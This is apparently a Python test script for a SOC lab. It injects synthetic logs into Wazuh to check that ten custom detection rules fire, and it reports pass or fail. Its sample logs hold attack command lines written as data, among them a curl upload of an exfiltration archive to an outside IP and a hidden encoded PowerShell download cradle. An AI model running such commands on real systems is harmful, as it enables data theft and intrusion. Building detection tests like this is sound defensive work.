#!/usr/bin/env python3
# =============================================================================
# test-rules.py — Wazuh Custom Rule Validation Test Suite
# Author: SOC Lab Project
# Description: Sends carefully crafted synthetic log entries to Wazuh's
#              ossec-logtest tool or the live Wazuh API to verify each of
#              the 10 custom rules fires correctly. Reports pass/fail with
#              colour-coded output and saves results to JSON.
# Usage: python3 test-rules.py [--mode logtest|api] [--rule 100001]
# Requirements: Must run on or with access to the Wazuh manager
# =============================================================================

import os
import sys
import json
import time
import subprocess
import argparse
import logging
import requests
import urllib3
from datetime import datetime, timezone
from dataclasses import dataclass, field, asdict
from typing import Optional

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s"
)
log = logging.getLogger(__name__)

# ── Colour output ─────────────────────────────────────────────────────────────
GREEN  = "\033[92m"
RED    = "\033[91m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
BOLD   = "\033[1m"
DIM    = "\033[2m"
RESET  = "\033[0m"

def c(text: str, code: str) -> str:
    return f"{code}{text}{RESET}" if sys.stdout.isatty() else text


# ── Test case definition ──────────────────────────────────────────────────────
@dataclass
class RuleTest:
    """Defines a single rule validation test case."""
    rule_id:       str
    name:          str
    description:   str
    log_entry:     str             # The raw log line to inject
    expect_rule:   str             # Rule ID that SHOULD fire
    expect_level:  int             # Minimum level expected
    expect_not:    list = field(default_factory=list)  # Rule IDs that should NOT fire
    mitre_id:      str = ""
    category:      str = "custom"
    platform:      str = "linux"   # linux or windows


# ── All 10 custom rule test cases ─────────────────────────────────────────────
TEST_CASES = [

    RuleTest(
        rule_id     = "100001",
        name        = "SSH Brute Force — Threshold Trigger",
        description = "Inject 11 rapid SSH auth failures from same IP to trigger frequency rule",
        log_entry   = (
            "Jan 15 10:00:00 test-agent sshd[1234]: "
            "Failed password for root from 203.0.113.42 port 54321 ssh2"
        ),
        expect_rule  = "100001",
        expect_level = 12,
        mitre_id     = "T1110.001",
        category     = "brute_force",
        platform     = "linux",
    ),

    RuleTest(
        rule_id     = "100002",
        name        = "SSH Brute Force — Successful Login After Failures",
        description = "After triggering 100001, inject a successful login from same IP",
        log_entry   = (
            "Jan 15 10:00:01 test-agent sshd[1235]: "
            "Accepted password for root from 203.0.113.42 port 54321 ssh2"
        ),
        expect_rule  = "100002",
        expect_level = 15,
        mitre_id     = "T1110.001",
        category     = "brute_force",
        platform     = "linux",
    ),

    RuleTest(
        rule_id     = "100003",
        name        = "LSASS Memory Access — Sysmon EID 10",
        description = "Simulate Sysmon ProcessAccess event targeting lsass.exe",
        log_entry   = json.dumps({
            "win": {
                "system": {
                    "eventID":      "10",
                    "providerName": "Microsoft-Windows-Sysmon",
                    "computer":     "WORKSTATION01",
                    "channel":      "Microsoft-Windows-Sysmon/Operational"
                },
                "eventdata": {
                    "sourceImage":  "C:\\Users\\attacker\\mimikatz.exe",
                    "targetImage":  "C:\\Windows\\system32\\lsass.exe",
                    "grantedAccess": "0x1410",
                    "callTrace":    "C:\\Windows\\system32\\ntdll.dll"
                }
            }
        }),
        expect_rule  = "100003",
        expect_level = 14,
        mitre_id     = "T1003.001",
        category     = "credential_dumping",
        platform     = "windows",
    ),

    RuleTest(
        rule_id     = "100004",
        name        = "PsExec Lateral Movement — Service Creation",
        description = "Simulate Windows Security EID 7045 showing PSEXESVC service install",
        log_entry   = json.dumps({
            "win": {
                "system": {
                    "eventID":      "7045",
                    "providerName": "Service Control Manager",
                    "computer":     "TARGET-SERVER",
                    "channel":      "System"
                },
                "eventdata": {
                    "serviceName":  "PSEXESVC",
                    "serviceType":  "user mode service",
                    "startType":    "demand start",
                    "imageFile":    "C:\\Windows\\PSEXESVC.exe",
                    "accountName":  "LocalSystem"
                }
            }
        }),
        expect_rule  = "100004",
        expect_level = 13,
        mitre_id     = "T1021.002",
        category     = "lateral_movement",
        platform     = "windows",
    ),

    RuleTest(
        rule_id     = "100005",
        name        = "Suspicious PowerShell — Encoded Download Cradle",
        description = "Sysmon EID 1 with PowerShell using -EncodedCommand and Net.WebClient",
        log_entry   = json.dumps({
            "win": {
                "system": {
                    "eventID":      "1",
                    "providerName": "Microsoft-Windows-Sysmon",
                    "computer":     "WORKSTATION02"
                },
                "eventdata": {
                    "image":        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "parentImage":  "C:\\Windows\\System32\\cmd.exe",
                    "commandLine":  "powershell.exe -nop -w hidden -EncodedCommand JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQA",
                    "user":         "WORKSTATION02\\jsmith"
                }
            }
        }),
        expect_rule  = "100005",
        expect_level = 12,
        mitre_id     = "T1059.001",
        category     = "powershell",
        platform     = "windows",
    ),

    RuleTest(
        rule_id     = "100006",
        name        = "Ransomware — Mass File Encryption Pattern",
        description = "20+ FIM events with ransomware extensions in 30s window",
        log_entry   = json.dumps({
            "syscheck": {
                "path":       "/home/user/Documents/quarterly-report.docx.wncry",
                "event":      "modified",
                "size_after":  45231,
                "size_before": 45231,
                "md5_after":   "d41d8cd98f00b204e9800998ecf8427e",
                "uname_after": "root"
            }
        }),
        expect_rule  = "100006",
        expect_level = 15,
        mitre_id     = "T1486",
        category     = "ransomware",
        platform     = "linux",
    ),

    RuleTest(
        rule_id     = "100007",
        name        = "Registry Run Key — Persistence via Sysmon EID 13",
        description = "Sysmon RegistryValueSet event writing to HKCU Run key",
        log_entry   = json.dumps({
            "win": {
                "system": {
                    "eventID":      "13",
                    "providerName": "Microsoft-Windows-Sysmon",
                    "computer":     "WORKSTATION03"
                },
                "eventdata": {
                    "eventType":    "SetValue",
                    "image":        "C:\\Users\\user\\AppData\\Roaming\\malware.exe",
                    "targetObject": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdate",
                    "details":      "C:\\Users\\user\\AppData\\Roaming\\malware.exe --silent"
                }
            }
        }),
        expect_rule  = "100007",
        expect_level = 12,
        mitre_id     = "T1547.001",
        category     = "persistence",
        platform     = "windows",
    ),

    RuleTest(
        rule_id     = "100008",
        name        = "Suspicious Scheduled Task — SYSTEM Run at Startup",
        description = "Security EID 4698 showing scheduled task created to run as SYSTEM",
        log_entry   = json.dumps({
            "win": {
                "system": {
                    "eventID":      "4698",
                    "providerName": "Microsoft-Windows-Security-Auditing",
                    "computer":     "WORKSTATION04"
                },
                "eventdata": {
                    "subjectUserName": "jsmith",
                    "taskName":        "\\Microsoft\\Windows\\UpdateCheck",
                    "taskContent":     "<Actions><Exec><Command>cmd.exe</Command><Arguments>/ru system /sc onstart /tr C:\\Windows\\Temp\\payload.exe</Arguments></Exec></Actions>"
                }
            }
        }),
        expect_rule  = "100008",
        expect_level = 12,
        mitre_id     = "T1053.005",
        category     = "persistence",
        platform     = "windows",
    ),

    RuleTest(
        rule_id     = "100009",
        name        = "Suspicious Outbound Connection — C2 Port 4444",
        description = "Sysmon EID 3 NetworkConnect to Metasploit default C2 port",
        log_entry   = json.dumps({
            "win": {
                "system": {
                    "eventID":      "3",
                    "providerName": "Microsoft-Windows-Sysmon",
                    "computer":     "WORKSTATION05"
                },
                "eventdata": {
                    "image":           "C:\\Windows\\System32\\cmd.exe",
                    "sourceIp":        "192.168.1.100",
                    "sourcePort":      "49512",
                    "destinationIp":   "203.0.113.99",
                    "destinationPort": "4444",
                    "protocol":        "tcp",
                    "initiated":       "true"
                }
            }
        }),
        expect_rule  = "100009",
        expect_level = 10,
        mitre_id     = "T1071",
        category     = "c2",
        platform     = "windows",
    ),

    RuleTest(
        rule_id     = "100010",
        name        = "Data Exfiltration — Large curl Upload",
        description = "Sysmon EID 1 showing curl with --data-binary flag (large POST)",
        log_entry   = json.dumps({
            "win": {
                "system": {
                    "eventID":      "1",
                    "providerName": "Microsoft-Windows-Sysmon",
                    "computer":     "FILESERVER01"
                },
                "eventdata": {
                    "image":        "C:\\tools\\curl.exe",
                    "parentImage":  "C:\\Windows\\System32\\cmd.exe",
                    "commandLine":  "curl --data-binary @C:\\Users\\Public\\exfil-archive.zip http://203.0.113.10:8080/upload",
                    "user":         "FILESERVER01\\administrator"
                }
            }
        }),
        expect_rule  = "100010",
        expect_level = 12,
        mitre_id     = "T1048",
        category     = "exfiltration",
        platform     = "windows",
    ),
]


# ── Test runner via ossec-logtest ─────────────────────────────────────────────
def run_logtest(log_entry: str) -> dict:
    """
    Run a log entry through Wazuh's ossec-logtest and parse the output.
    Returns dict with fired_rule_id, level, description, decoder.
    """
    result = {
        "fired_rule": None,
        "level":      None,
        "description": None,
        "decoder":    None,
        "raw_output": "",
        "error":      None,
    }

    try:
        proc = subprocess.run(
            ["/var/ossec/bin/ossec-logtest", "-U", "test:test:localhost"],
            input=log_entry + "\n",
            capture_output=True, text=True, timeout=15
        )
        output = proc.stdout + proc.stderr
        result["raw_output"] = output

        # Parse ossec-logtest output
        for line in output.splitlines():
            line = line.strip()
            if "Rule id:" in line:
                result["fired_rule"] = line.split("Rule id:")[-1].strip().split()[0]
            elif "Level:" in line:
                try:
                    result["level"] = int(line.split("Level:")[-1].strip().split()[0])
                except ValueError:
                    pass
            elif "Description:" in line:
                result["description"] = line.split("Description:")[-1].strip()
            elif "Decoder matched:" in line:
                result["decoder"] = line.split("Decoder matched:")[-1].strip()

    except FileNotFoundError:
        result["error"] = "ossec-logtest not found — run on Wazuh manager"
    except subprocess.TimeoutExpired:
        result["error"] = "ossec-logtest timed out"
    except Exception as exc:
        result["error"] = str(exc)

    return result


# ── Test runner via Wazuh API logtest ────────────────────────────────────────
def run_api_logtest(log_entry: str, token: str, api_url: str) -> dict:
    """
    Submit log entry to Wazuh API logtest endpoint.
    Requires Wazuh 4.2+ with logtest API support.
    """
    result = {
        "fired_rule": None,
        "level":      None,
        "description": None,
        "decoder":    None,
        "raw_output": "",
        "error":      None,
    }

    try:
        resp = requests.put(
            f"{api_url}/logtest",
            headers={"Authorization": f"Bearer {token}"},
            json={"event": log_entry, "log_format": "syslog",
                  "location": "test"},
            verify=False, timeout=15
        )
        resp.raise_for_status()
        data = resp.json().get("data", {}).get("output", {})

        rule = data.get("rule", {})
        result["fired_rule"]  = str(rule.get("id", ""))
        result["level"]       = rule.get("level")
        result["description"] = rule.get("description", "")
        result["decoder"]     = data.get("decoder", {}).get("name", "")
        result["raw_output"]  = json.dumps(data, indent=2)

    except Exception as exc:
        result["error"] = str(exc)

    return result


# ── Test evaluation ───────────────────────────────────────────────────────────
@dataclass
class TestResult:
    test:         RuleTest
    passed:       bool
    fired_rule:   Optional[str]
    fired_level:  Optional[int]
    description:  Optional[str]
    error:        Optional[str]
    raw_output:   str = ""
    duration_ms:  int = 0


def evaluate_test(test: RuleTest, mode: str, token: str = "",
                  api_url: str = "") -> TestResult:
    """Run a single test case and evaluate pass/fail."""
    start = time.monotonic()

    # For frequency-based rules (100001, 100006), inject multiple times
    fire_count = 11 if test.rule_id in ("100001", "100006") else 1
    logtest_result = {"fired_rule": None, "level": None,
                      "description": None, "error": None, "raw_output": ""}

    for i in range(fire_count):
        if mode == "api" and token:
            logtest_result = run_api_logtest(test.log_entry, token, api_url)
        else:
            logtest_result = run_logtest(test.log_entry)

        # For frequency rules, check after each injection
        if logtest_result["fired_rule"] == test.expect_rule:
            break
        time.sleep(0.05)   # Small delay between rapid injections

    duration_ms = int((time.monotonic() - start) * 1000)
    fired_rule  = logtest_result.get("fired_rule")
    fired_level = logtest_result.get("level")
    error       = logtest_result.get("error")

    # Evaluate pass criteria
    if error:
        passed = False
    else:
        rule_match  = fired_rule == test.expect_rule
        level_ok    = (fired_level is not None and
                       fired_level >= test.expect_level)
        passed = rule_match and level_ok

    return TestResult(
        test         = test,
        passed       = passed,
        fired_rule   = fired_rule,
        fired_level  = fired_level,
        description  = logtest_result.get("description"),
        error        = error,
        raw_output   = logtest_result.get("raw_output", ""),
        duration_ms  = duration_ms,
    )


# ── Reporting ─────────────────────────────────────────────────────────────────
def print_results(results: list, verbose: bool = False) -> None:
    """Print formatted test results table."""
    passed = sum(1 for r in results if r.passed)
    failed = len(results) - passed

    print()
    print(c("═" * 72, CYAN))
    print(c(f"  WAZUH CUSTOM RULE TEST RESULTS", BOLD))
    print(c("═" * 72, CYAN))
    print()

    for r in results:
        status = c(" PASS ", GREEN + BOLD) if r.passed else c(" FAIL ", RED + BOLD)
        rule_id = r.test.rule_id
        name    = r.test.name[:42].ljust(42)

        if r.error:
            detail = c(f"ERROR: {r.error[:40]}", RED)
        elif r.passed:
            detail = c(
                f"Rule {r.fired_rule} | L{r.fired_level} | {r.duration_ms}ms",
                DIM
            )
        else:
            expected = f"expected rule {r.test.expect_rule}"
            got      = f"got {r.fired_rule or 'nothing'}"
            detail   = c(f"{expected} | {got}", YELLOW)

        print(f"  [{status}] Rule {rule_id}  {name}  {detail}")

        if verbose and not r.passed and r.raw_output:
            print(c(f"           Raw output:", DIM))
            for line in r.raw_output.splitlines()[:10]:
                print(c(f"             {line}", DIM))

    print()
    print(c("─" * 72, DIM))
    print(f"  Results:  "
          f"{c(str(passed) + ' passed', GREEN + BOLD)}  /  "
          f"{c(str(failed) + ' failed', RED + BOLD if failed > 0 else GREEN)}  "
          f"/ {len(results)} total")

    if failed == 0:
        print(c("  ✔  ALL CUSTOM RULES VALIDATED SUCCESSFULLY", GREEN + BOLD))
    else:
        print(c(f"  ✖  {failed} RULE(S) DID NOT FIRE AS EXPECTED", RED + BOLD))

    print(c("═" * 72, CYAN))
    print()


def save_results_json(results: list, output_path: str) -> None:
    """Save test results to JSON for CI/CD integration."""
    output = {
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "summary": {
            "total":  len(results),
            "passed": sum(1 for r in results if r.passed),
            "failed": sum(1 for r in results if not r.passed),
        },
        "results": [
            {
                "rule_id":      r.test.rule_id,
                "name":         r.test.name,
                "passed":       r.passed,
                "expected_rule": r.test.expect_rule,
                "fired_rule":   r.fired_rule,
                "fired_level":  r.fired_level,
                "duration_ms":  r.duration_ms,
                "error":        r.error,
            }
            for r in results
        ]
    }

    with open(output_path, "w") as f:
        json.dump(output, f, indent=2)
    log.info(f"Results saved to {output_path}")


# ── Main ──────────────────────────────────────────────────────────────────────
def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Validate Wazuh custom rules with synthetic log injection"
    )
    parser.add_argument(
        "--mode", choices=["logtest", "api"], default="logtest",
        help="Test mode: logtest (uses ossec-logtest binary) or api (Wazuh REST API)"
    )
    parser.add_argument(
        "--rule", type=str, default=None,
        help="Test only a specific rule ID (e.g. --rule 100001)"
    )
    parser.add_argument(
        "--verbose", action="store_true",
        help="Show raw ossec-logtest output for failed tests"
    )
    parser.add_argument(
        "--output", type=str, default=None,
        help="Save results to JSON file (e.g. --output results.json)"
    )
    return parser.parse_args()


def main() -> None:
    args  = parse_args()
    token = ""

    # Authenticate if using API mode
    if args.mode == "api":
        api_url  = os.environ.get("WAZUH_API_URL", "https://localhost:55000")
        api_user = os.environ.get("WAZUH_API_USER", "wazuh-wui")
        api_pass = os.environ.get("WAZUH_API_PASSWORD", "")
        try:
            resp = requests.post(
                f"{api_url}/security/user/authenticate",
                auth=(api_user, api_pass),
                verify=False, timeout=10
            )
            token = resp.json()["data"]["token"]
            log.info("Authenticated with Wazuh API for logtest")
        except Exception as exc:
            log.error(f"API auth failed: {exc} — falling back to logtest mode")
            args.mode = "logtest"

    # Filter tests if specific rule requested
    tests = TEST_CASES
    if args.rule:
        tests = [t for t in TEST_CASES if t.rule_id == args.rule]
        if not tests:
            log.error(f"No test found for rule {args.rule}")
            sys.exit(1)
        log.info(f"Running test for rule {args.rule} only")

    print()
    print(c(f"  Running {len(tests)} rule test(s) in '{args.mode}' mode...", CYAN))
    print()

    results = []
    for test in tests:
        log.info(f"Testing rule {test.rule_id}: {test.name}")
        result = evaluate_test(
            test, args.mode, token,
            os.environ.get("WAZUH_API_URL", "https://localhost:55000")
        )
        results.append(result)

    print_results(results, verbose=args.verbose)

    if args.output:
        save_results_json(results, args.output)

    # Exit 1 if any test failed (useful for CI/CD pipelines)
    failed = sum(1 for r in results if not r.passed)
    sys.exit(1 if failed > 0 else 0)


if __name__ == "__main__":
    main()
